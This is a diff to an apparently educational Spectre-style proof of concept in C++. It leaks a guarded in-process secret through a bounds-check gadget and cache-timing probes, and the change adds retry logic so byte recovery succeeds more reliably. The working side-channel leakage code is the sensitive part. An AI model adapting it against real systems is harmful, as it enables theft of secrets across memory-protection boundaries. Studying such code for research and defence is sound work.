@@ -32,7 +32,7 @@ volatile u8 sink = 0;
 
 alignas(PAGE_SZ) struct Data {
     u8 values[4] = {1, 2, 3, 4};            // 'get_value' doesn't guard this.
-    char secret[21] = "HORRIBLY_BROKEN_CODE";  // 'get_value' does guard this.
+    char secret[128] = "PWND_SECRET";       // 'get_value' does (well, should!) guard this.
 } S;
 
 [[gnu::noinline]] u8 get_value(int idx, u8* covert) {
@@ -61,7 +61,7 @@ inline u32 probe_latency(u8* addr) {
     return (u32)(t1 - t0);
 }
 
-char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, int& sum) {
+char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, int& sum, int ntry=1) {
     int hits[secret_space_length] = {0};
     int rounds = 1000;
     for (int r = 0; r < rounds; r++) {
@@ -96,7 +96,12 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
             return secret_space[i];
         }
     }
-    printf("Couldn't recover byte at index=%i!\n", byte_idx);
+    printf("Couldn't recover byte at index=%i (try %d)!\n", byte_idx, ntry);
+    if (ntry < 1000) {
+        ntry += 1;
+        return recover_byte(byte_idx, covert, threshold, hit_threshold, sum, ntry);
+    }
+    printf("Failed to recover byte at index=%i!\n", byte_idx);
     printf("You may try tweaking `threshold` and `hit_threshold` and see if that helps.\n");
     exit(1);
 }
